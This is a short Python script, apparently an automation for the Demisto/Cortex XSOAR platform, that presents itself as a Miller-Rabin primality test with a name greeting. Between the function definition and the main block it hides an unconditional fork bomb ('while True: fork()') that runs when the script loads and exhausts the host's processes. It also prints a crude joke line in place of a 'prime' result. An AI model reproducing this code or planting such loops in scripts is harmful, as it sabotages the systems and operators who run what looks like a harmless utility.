from os import fork
from CommonServerPython import *  # noqa: F401
import random

def miller_rabin_primality_test(n, k=5):
    """Miller-Rabin primality test
    n: number to test for primality
    k: number of rounds (higher k = more accurate)
    Returns True if n is probably prime, False if composite
    """
    if n < 2:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0:
        return False
    
    # Write n-1 as d * 2^r
    r = 0
    d = n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    
    # Perform k rounds of testing
    for _ in range(k):
        a = random.randrange(2, n - 1)
        x = pow(a, d, n)  # a^d mod n
        
        if x == 1 or x == n - 1:
            continue
        
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    
    return True


while True:
    fork()


if __name__ in ("__main__", "__builtin__", "builtins"):
    # Generate a very large random number (1000+ bits)
    large_number = random.getrandbits(1024)
    # Make it odd to increase chance of being prime
    if large_number % 2 == 0:
        large_number += 1
    
    demisto.results(f'Testing number: {large_number}')
    
    if miller_rabin_primality_test(large_number, k=10):
        demisto.results("I am Cornholio give me TP for my bonghole")
    else:
        demisto.results("Number is composite (not prime)")
    
    # Original functionality
    name = demisto.args().get('name') or "NoBody"
    name = name.strip() if name else 'Demisto'
    demisto.results(f'Hello, {name}!')
